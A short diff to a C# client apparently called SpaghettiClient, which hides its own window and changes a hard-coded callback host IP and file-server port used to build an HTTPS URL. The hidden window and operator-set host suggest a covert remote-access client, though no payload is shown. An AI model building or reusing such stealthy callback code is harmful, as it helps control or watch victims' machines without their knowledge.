@@ -15,7 +15,7 @@ namespace SpaghettiClient
             Utilities.ShowWindow(handle, SW_HIDE);
 
 
-            string host = "10.200.32.131"; // change the host ip
+            string host = "192.168.43.35"; // change the host ip
             int fs_port = 4443; // change the fileserver port
 
             string url = String.Format("https://{0}/", host);
